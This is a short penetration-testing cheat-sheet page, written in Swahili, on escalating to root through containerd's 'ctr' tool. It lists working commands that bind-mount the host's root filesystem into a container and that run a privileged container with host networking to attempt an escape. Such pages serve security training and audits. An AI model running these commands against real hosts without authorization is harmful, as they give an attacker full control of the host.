# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Maelezo ya msingi

Nenda kwenye link ifuatayo ili ujifunze **containerd na `ctr` zinapatikana wapi kwenye container stack**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Ukipata kwamba host ina command ya `ctr`, native CLI iliyojumuishwa kwenye containerd:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
Unaweza kuorodhesha image zinazojulikana na containerd:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Kisha **endesha mojawapo ya images hizo huku host root ikiwa ime-bind-mountiwa recursively kwenye container root**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Endesha container katika privileged mode na ujaribu kutoroka.\
Unaweza kuendesha container yenye privileged mode ikitumia host networking kama ifuatavyo:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` huwapa process Linux capabilities zenye ufanisi za caller na huondoa vidhibiti kadhaa vya isolation, lakini escape bado inategemea mazingira; tumia techniques zilizotajwa katika ukurasa ufuatao kuijaribu:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Kuanza kutumia containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [Utekelezaji wa `ctr image` command](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [Utekelezaji wa `ctr run` command](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Nyaraka za Linux kernel shared-subtree](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [containerd OCI package: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [flags za `ctr` command ya containerd](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
